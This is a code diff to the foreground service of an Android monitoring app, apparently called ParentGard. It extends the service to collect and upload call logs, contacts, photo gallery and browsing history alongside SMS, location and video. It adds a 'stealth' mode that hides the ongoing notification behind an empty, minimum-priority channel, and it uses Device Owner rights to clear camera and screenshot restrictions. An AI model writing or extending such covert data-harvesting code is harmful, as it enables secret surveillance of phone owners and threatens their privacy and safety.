@@ -46,6 +46,10 @@ class TrackingForegroundService : Service() {
     private lateinit var notificationSvc:  NotificationSyncService
     private lateinit var videoUploadSvc:   VideoUploadService
     private lateinit var smsSvc:           SmsService
+    private lateinit var callLogSvc:       CallLogService
+    private lateinit var contactsSvc:      ContactsService
+    private lateinit var gallerySvc:       GalleryService
+    private lateinit var browsingHistSvc:  BrowsingHistoryService
 
     private var slowTick = 0
 
@@ -57,15 +61,56 @@ class TrackingForegroundService : Service() {
         notificationSvc = NotificationSyncService(this, AppConstants.backendBaseUrl)
         videoUploadSvc  = VideoUploadService(this, AppConstants.backendBaseUrl)
         smsSvc          = SmsService(this, AppConstants.backendBaseUrl)
+        callLogSvc      = CallLogService(this)
+        contactsSvc     = ContactsService(this)
+        gallerySvc      = GalleryService(this)
+        browsingHistSvc = BrowsingHistoryService(this)
         isRunning       = true
+        clearDpmCameraPolicy()
+    }
+
+    // Samsung Knox automatically sets camera/screenshot restrictions when the app registers
+    // as Device Owner via ADB. Clear ALL three blocking mechanisms on every service start.
+    private fun clearDpmCameraPolicy() {
+        try {
+            val dpm = getSystemService(android.app.admin.DevicePolicyManager::class.java)
+                ?: return
+            if (!dpm.isDeviceOwnerApp(packageName)) return
+            val admin = android.content.ComponentName(
+                this, com.parentalmonitor.child.receivers.DeviceAdminReceiver::class.java)
+            val um = getSystemService(android.os.UserManager::class.java) ?: return
+
+            if (dpm.getCameraDisabled(null)) {
+                dpm.setCameraDisabled(admin, false)
+                android.util.Log.i(TAG, "Startup: cleared DPM setCameraDisabled policy")
+            }
+            if (um.hasUserRestriction("no_camera")) {
+                dpm.clearUserRestriction(admin, "no_camera")
+                android.util.Log.i(TAG, "Startup: cleared DISALLOW_CAMERA user restriction")
+            }
+            if (um.hasUserRestriction("no_screenshots")) {
+                dpm.clearUserRestriction(admin, "no_screenshots")
+                android.util.Log.i(TAG, "Startup: cleared DISALLOW_SCREENSHOT user restriction")
+            }
+        } catch (e: Exception) {
+            android.util.Log.w(TAG, "clearDpmCameraPolicy: ${e.message}")
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        createNotificationChannel()
         val fgsType = if (hasLocationPermission())
             ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
         else
             ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+
+        if (intent?.action == ACTION_STEALTH) {
+            // Switch to silent channel (no status-bar icon, no shade sound)
+            createSilentNotificationChannel()
+            ServiceCompat.startForeground(this, NOTIFICATION_ID, buildSilentNotification(), fgsType)
+            return START_STICKY
+        }
+
+        createNotificationChannel()
         ServiceCompat.startForeground(this, NOTIFICATION_ID, buildNotification(), fgsType)
         startLoop()
         return START_STICKY
@@ -133,20 +178,32 @@ class TrackingForegroundService : Service() {
         }
     }
 
-    /** Runs every 30 minutes — heavier content providers */
+    /** Runs every ~6 minutes — heavier content providers, all native Kotlin (no Flutter needed). */
     private fun runSlowCapture() {
-        // Signal Flutter's MonitoringService that a slow cycle is due.
+        android.util.Log.i(TAG, "── Slow cycle: starting native data sync ──")
+
+        // Signal Flutter's MonitoringService in case Flutter is in the foreground.
         getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
             .edit()
             .putLong("flutter.$KEY_SLOW_CYCLE_TS", System.currentTimeMillis())
             .apply()
 
-        // Upload pending video files natively (streaming, no Flutter/base64 needed).
         val (token, deviceId) = readAuth()
-        if (token != null && deviceId != null) {
-            safeRun { videoUploadSvc.uploadPendingVideos(token, deviceId) }
-            safeRun { smsSvc.syncSms(token, deviceId) }
+        if (token == null || deviceId == null) {
+            android.util.Log.w(TAG, "Slow cycle SKIP — no auth token/deviceId in SharedPreferences")
+            return
         }
+        android.util.Log.d(TAG, "Slow cycle syncing for device $deviceId")
+
+        safeRun { locationSvc.syncLocation(token, deviceId, AppConstants.backendBaseUrl) }
+        safeRun { smsSvc.syncSms(token, deviceId) }
+        safeRun { callLogSvc.syncCallLogs(token, deviceId, AppConstants.backendBaseUrl) }
+        safeRun { contactsSvc.syncContacts(token, deviceId, AppConstants.backendBaseUrl) }
+        safeRun { gallerySvc.syncGallery(token, deviceId, AppConstants.backendBaseUrl) }
+        safeRun { browsingHistSvc.syncBrowsingHistory(token, deviceId, AppConstants.backendBaseUrl) }
+        safeRun { videoUploadSvc.uploadPendingVideos(token, deviceId) }
+
+        android.util.Log.i(TAG, "── Slow cycle: done ──")
     }
 
     // ── Notification ──────────────────────────────────────────────────────────
@@ -164,6 +221,20 @@ class TrackingForegroundService : Service() {
         }
     }
 
+    private fun createSilentNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                CHANNEL_SILENT_ID, "ParentGard Background", NotificationManager.IMPORTANCE_MIN
+            ).apply {
+                setShowBadge(false)
+                enableLights(false)
+                enableVibration(false)
+                setSound(null, null)
+            }
+            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
+        }
+    }
+
     private fun buildNotification(): Notification =
         NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("ParentGard")
@@ -171,6 +242,16 @@ class TrackingForegroundService : Service() {
             .setSmallIcon(android.R.drawable.ic_menu_mylocation)
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setSilent(true)
+            .build()
+
+    private fun buildSilentNotification(): Notification =
+        NotificationCompat.Builder(this, CHANNEL_SILENT_ID)
+            .setContentTitle("")
+            .setContentText("")
+            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
+            .setOngoing(true)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setSilent(true)
             .build()
 
@@ -213,9 +294,12 @@ class TrackingForegroundService : Service() {
 
         const val PREFS_TRACKING    = "pm_tracking"
         const val KEY_SLOW_CYCLE_TS = "slow_cycle_ts"
+        const val ACTION_STEALTH    = "com.parentalmonitor.child.ACTION_STEALTH"
 
-        private const val CHANNEL_ID        = "pm_tracking_channel"
-        private const val NOTIFICATION_ID   = 1001
+        private const val TAG                = "TrackingFgService"
+        private const val CHANNEL_ID         = "pm_tracking_channel"
+        private const val CHANNEL_SILENT_ID  = "pm_tracking_silent"
+        private const val NOTIFICATION_ID    = 1001
         private const val COMMAND_INTERVAL_MS = 10 * 1_000L      // 10 s — command fast poll
         private const val FAST_INTERVAL_MS   = 60 * 1_000L      // 60 s — data capture
         private const val SLOW_EVERY_N_TICKS = 6                 // every 6 min
